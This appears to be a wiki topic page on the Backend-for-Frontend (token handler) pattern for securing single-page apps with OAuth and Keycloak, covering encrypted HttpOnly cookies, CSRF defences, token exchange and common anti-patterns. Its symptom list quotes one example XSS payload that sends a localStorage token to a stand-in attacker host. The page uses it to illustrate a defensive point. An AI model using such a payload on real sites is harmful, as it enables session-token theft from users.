---
title: BFF / Token Handler Pattern for SPAs
type: topic
domain: keycloak
slug: bff-token-handler
summary: "A Backend-for-Frontend (BFF) acts as a confidential OAuth client that runs the Authorization Code + PKCE flow on behalf of a SPA, stores all tokens server-side, and exposes only encrypted HttpOnly session cookies to the browser — eliminating token theft via XSS as an attack vector."
sources:
  - web:https://www.ietf.org/archive/id/draft-ietf-oauth-browser-based-apps-26.html (draft-ietf-oauth-browser-based-apps-26, fetched 2026-06-17)
  - web:https://curity.io/resources/learn/the-bff-pattern/ (Curity BFF pattern, fetched 2026-06-17)
  - web:https://curity.io/resources/learn/token-handler-overview/ (Curity Token Handler overview, fetched 2026-06-17)
  - web:https://www.keycloak.org/docs/latest/securing_apps/index.html (Keycloak securing-apps OSS, fetched 2026-06-17)
provenance_extracted: 28
provenance_inferred: 6
provenance_ambiguous: 0
tags: [clients, tokens, security, profile]
status: reviewed
updated: 2026-06-17
---

# BFF / Token Handler Pattern for SPAs

**A server-side Backend-for-Frontend (BFF) component acts as the confidential OAuth client for a SPA, brokering all token acquisition and keeping tokens out of the browser entirely.**

## Rule

The BFF pattern is defined in §6.1 of the OAuth 2.0 for Browser-Based Apps draft (BBA-26) as the preferred architecture for SPAs handling sensitive or personal data. Three core requirements define correct implementation:

**1. Confidential client on the backend only.**
The BFF MUST be a confidential OAuth client using the Authorization Code grant with PKCE (S256). The SPA itself MUST be treated as a public client — it never sees the client secret and never hits the AS token endpoint directly (BBA-26 §6.1.3.1; Keycloak securing-apps → public vs confidential clients). The SPA makes same-origin Ajax calls to the BFF's own API; the BFF holds the credential (secret, mTLS key, or private key JWT) (Curity Token Handler §"OAuth Agent").

**2. All tokens encrypted in HttpOnly cookies.**
The BFF MUST encrypt access, refresh, and ID tokens before writing them to cookies; no token value is ever returned in a JSON response body to JavaScript (Curity Token Handler §"OAuth Agent Cookies"). Cookies MUST carry `HttpOnly`, `Secure`, `SameSite=Strict`; SHOULD use the `__Host-` prefix; SHOULD NOT set `Domain` (BBA-26 §6.1.3.2). Client-side session cookies SHOULD encrypt their contents so disk or malware access cannot decode tokens without the server key (BBA-26 §6.1.3.2).

**3. BFF as a non-transparent proxy with allowlist controls.**
All API calls from the SPA pass through the BFF (or a co-located API-gateway proxy). The BFF MUST maintain an allowlist of approved upstream resource servers and MUST NOT forward to arbitrary URLs named by the browser (BBA-26 §6.1.3.6). In the Curity model this is split: an OAuth Agent handles the code flow, and an OAuth Proxy (API-gateway plugin) decrypts the proxy cookie and injects `Authorization: Bearer` toward microservices — optionally invoking the Phantom Token pattern for opaque-to-JWT conversion (Curity Token Handler §"OAuth Proxy").

**Cookie size constraint (inferred).** Prefer compact signing algorithms (ES256, EdDSA) or opaque access tokens to stay under the ~4 KB per-cookie and ~4–8 KB total-header limits. Exceeding these produces HTTP `431 Request Header Fields Too Large` before the request reaches the backend (Curity Token Handler §"Cookie Limits").

**Between-flow ephemeral state.** During the login flow the BFF MUST store OAuth `state` and PKCE `code_verifier` in a temporary encrypted HttpOnly cookie — not in the URL, response body, or localStorage — so they survive the redirect round-trip but are never readable by JavaScript (Curity Token Handler §"OAuth Agent Cookies").

**Token-mediating backend** is a weaker alternative: the backend retains the refresh token server-side but returns the access token to the browser. BBA-26 §6.2 permits this only when a proxying BFF is not feasible. The access token remains stealable from the browser (§5.1.1/§5.1.2), so the threat model is materially weaker than a full BFF.

**BFF downscoping via token exchange.** When the BFF calls downstream microservices it SHOULD use token exchange with the `audience` parameter to issue a narrower token restricted to each downstream resource, rather than forwarding the original broad-scoped token (Keycloak securing-apps → token-exchange). Scope escalation beyond the original token's grants must be blocked by policy (e.g. the `downscope-assertion-grant-enforcer` executor); token exchange never creates a new user session and the exchanged token inherits the original session lifetime (inferred from Keycloak securing-apps → token-exchange).

**CSRF — three-layer defence.**
(1) `SameSite=Strict` on all BFF cookies. (2) CORS origin enforcement / preflight. (3) A required fixed custom request header (e.g. `token-handler-version: 1` or `My-Static-Header: 1`) on every Ajax call, so a cross-site attacker's form cannot issue a CORS "simple request" that bypasses preflight (BBA-26 §6.1.3.3; Curity Token Handler §"Cross Site Request Forgery Protections"). `SameSite=Strict` alone is insufficient when the BFF shares an eTLD+1 with sibling subdomains that could be taken over (BBA-26 §6.1.3.3.1).

**Hosting constraint (inferred).** The BFF components MUST be on the same parent domain as the SPA's web origin so cookies are first-party. Hosting the OAuth Agent on a separate root domain causes tracking-prevention heuristics in Safari and Firefox to drop cookies as third-party (Curity BFF §"Different Deployment Options"; Curity Token Handler §"Hosting Prerequisite").

**Static content separation.** The SPA's CDN/static host issues no cookies and handles no OAuth logic. Multiple micro-frontends under the same parent domain can share a single BFF's cookies without re-login (Curity Token Handler §"Token Handler Pattern" / §"Micro-Frontends").

**DPoP binding at the BFF (upstream/OSS).** When the BFF issues DPoP-bound tokens, each outbound request to a resource server requires a fresh proof signed by the private key, with `typ: dpop+jwt`, the algorithm, embedded public-key JWK, and `htm`/`htu` bindings. When a resource server returns `DPoP-Nonce`, the next proof must include it; caching old proofs after a nonce is issued produces `use_dpop_nonce` errors (Keycloak securing-apps → dpop). See [[dpop-sender-constraining]] and [[mtls-bound-tokens]] for sender-constraining options.

## Anti-pattern

| Anti-pattern | Root cause |
|---|---|
| SPA runs the Authorization Code flow itself and ships `client_secret` in the JS bundle | Treating the SPA as a confidential client |
| Tokens returned in a JSON response to JavaScript | Missing BFF intermediation step |
| Plaintext JWT in the session cookie | Omitting BFF-side encryption of cookie payload |
| Cookie without `HttpOnly` or with broad `Domain=.example.com` | Subdomain-leakable session |
| BFF acts as open proxy — forwards to any URL the SPA sends | Missing resource-server allowlist |
| `state` / `code_verifier` stored in localStorage between `/login/start` and `/login/end` | BFF not using ephemeral HttpOnly login-state cookie |
| No custom request header requirement on BFF endpoints | Simple-request CSRF bypasses preflight |
| RS256 + large claims packed into a single cookie | Cookie over 4 KB → HTTP 431 |
| OAuth Agent on a different root domain from the SPA | Cookies flagged third-party by browser |
| Forwarding the original broad-scoped token to every downstream microservice | Violates least privilege; token exchange not used |

## Symptom

Observable failures that point to a missing or broken BFF pattern:

- **`client_secret` visible in network tab or bundled JS / source maps** — SPA is acting as a confidential client (pen-test: "credentials exposed to browser").
- **Raw JWT/opaque token visible in DevTools** (Network or Application > Storage) — tokens returned to JavaScript rather than encrypted into cookies.
- **XSS payload runs `fetch('//attacker/?t='+localStorage.getItem('token'))`** — access or refresh token was stored in Web Storage.
- **HTTP `431 Request Header Fields Too Large`** — cookie payload too large, likely RS256 or over-stuffed claims.
- **`SameSite cookie blocked` console warning** or intermittent 401 in Safari/Firefox — BFF or OAuth Agent on a different root domain; cookie dropped as third-party.
- **Cross-site form submits successfully against the BFF** (`/refresh`, `/logout`) without triggering a CORS preflight — custom-header CSRF defence absent.
- **`code_verifier` lost on reload** or `state_mismatch` at callback — login-state stored in localStorage rather than an ephemeral HttpOnly cookie.
- **`invalid_dpop_proof`** — DPoP proof reused across requests or `DPoP-Nonce` not incorporated after a nonce challenge.
- **Downstream microservice receives a token with excessive permissions** — BFF not downscoping via token exchange before forwarding.
- **"invalid_client"** once a leaked secret is revoked — SPA was registered as a confidential client.

## Surface (client vs backend)

**Browser / SPA (client):**
- Makes same-origin Ajax calls to the BFF's small endpoint set (`GET /session`, `POST /login/start`, `POST /login/end`, `POST /refresh`, `POST /logout`) — never to the AS directly.
- Attaches a custom fixed header (e.g. `token-handler-version: 1`) on every request as the CSRF proof.
- Reads `login_url` from the BFF response and performs the browser redirect itself (so SPA scroll/state survives the OAuth bounce).
- Sends the proxy cookie with each API call; the browser attaches it automatically — the SPA never reads its value.
- Never stores a token value; never calls `localStorage.setItem` or `sessionStorage.setItem` with a token.
- Must still apply CSP, input validation, and output encoding — the BFF limits blast radius but does not replace a secure-SDLC (inferred from Curity BFF §"The Security Issues of an SPA").

**Backend / BFF (server):**
- Registered as a confidential client at the AS (client secret, private-key JWT, or mTLS).
- Completes the Authorization Code + PKCE exchange with the AS; stores resulting tokens encrypted in HttpOnly cookies.
- Enforces an allowlist of approved resource-server targets before proxying any request.
- Validates the custom CSRF header on every inbound request; enforces CORS with a restrictive origin allowlist.
- Exposes `/refresh` that rotates the access token (and refresh token) server-side; serializes concurrent refresh races.
- Optionally delegates token decryption and bearer injection to a co-located API-gateway plugin (OAuth Proxy) rather than doing it inline per microservice.
- When calling downstream services, issues a downscoped token via token exchange rather than forwarding the original token.

## Contradictions / caveats

- The Keycloak OSS docs describe the SPA itself as a public client, then separately recommend putting a confidential client behind the BFF. Both statements are consistent: the SPA front end is public, the BFF back end is confidential — they are different registered clients (inferred reconciliation).
- BBA-26 is an IETF Internet-Draft (rev-26, Dec 2025), not yet an RFC. Its recommendations are directionally stable but normative status may change.
- The Curity "Token Handler" pattern is a vendor articulation of the BBA-26 BFF model. Terminology (OAuth Agent, OAuth Proxy, Phantom Token) is Curity-specific; the underlying protocol requirements map directly to BBA-26 §6.1.
- BFF residual risk: a successful XSS cannot steal tokens, but can still replay the session cookie to call APIs or exfiltrate user data via legitimate endpoints. The BFF limits the blast radius; it does not eliminate XSS impact (BBA-26 §5.1.4 → §5.2.3).

## See also

- [[oidc-client-best-practices]]
- [[token-storage-browser]]
- [[refresh-token-rotation]]
- [[pkce]]
- [[state-and-nonce]]
- [[cors-for-spa]]
- [[dpop-sender-constraining]]
- [[mtls-bound-tokens]]
- [[redirect-uri-validation]]
- [[rp-initiated-logout]]
- [[back-channel-logout]]
- [[token-revocation]]
- [[token-introspection]]
- [[token-exchange]]
- [[access-token-validation-resource-server]]
- [[audience-and-scope-checks]]
- [[bearer-token-usage]]
- [[jwt-validation-pitfalls]]
- [[service-to-service-client-credentials]]
- [[oidc-grant-types]]
- [[oidc-endpoints]]
- [[tokens-and-sessions]]
- [[client-authentication-methods]]
- [[securing-apps-oidc-saml]]
- [[fapi2-security-profile]]
- [[sso-implementation-review]]
